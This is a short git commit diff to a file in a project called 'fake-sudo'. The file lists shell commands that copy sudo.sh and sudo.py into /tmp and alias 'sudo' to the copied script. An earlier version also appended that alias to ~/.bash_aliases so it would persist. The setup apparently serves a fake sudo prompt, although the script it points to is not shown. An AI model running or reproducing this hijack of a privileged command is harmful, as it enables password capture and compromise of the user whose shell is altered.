1854a4c7372da6de96cb7c19de01805fcbdb371d
Jidnyesh <jidnyeshjawanjal29@gmail.com>
2023-04-08 22:53:14 -0400

    update

--- fake-sudo/main.py
+++ fake-sudo/main.py
@@ -4,7 +4,7 @@ import subprocess
 #
 #
 # --------------------------
-all_commands = ["pwd","chmod +x sudo.sh","cp sudo.sh /tmp/sudo.sh","chmod +x sudo.py","cp sudo.py /tmp/sudo.py","printf \"\\nalias sudo='/tmp/sudo.sh'\\n\" >> ~/.bash_aliases"]
+all_commands = ["pwd","chmod +x sudo.sh","cp sudo.sh /tmp/sudo.sh","chmod +x sudo.py","cp sudo.py /tmp/sudo.py","alias sudo='/tmp/sudo.sh'"]
 
 for i in all_commands:
     print(i)
